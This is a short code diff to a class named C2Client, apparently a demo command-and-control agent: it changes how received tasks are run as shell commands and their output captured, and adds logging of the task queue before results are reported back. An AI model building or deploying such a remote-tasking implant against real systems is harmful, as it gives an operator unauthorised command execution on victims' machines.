@@ -164,7 +164,7 @@ class C2Client:
     def process_tasking(self, task: str) -> str:
         # yep this is super wonky and prone to huge vulnerabilities and errors.  just a demo
         logger.debug(f"Running {task}")
-        results = subprocess.run(task)
+        results = subprocess.check_output(task).decode().strip()
         return results
 
 
@@ -184,6 +184,7 @@ class C2Client:
                 task_id = row[0]
                 results = self.process_tasking(task)
                 self.tasking_queue[index].append(results)
+            logger.debug(f"updated tasking queue: {self.tasking_queue}")
             self.update_tasking()
             time.sleep(self.sleep)
             self.get_tasks()
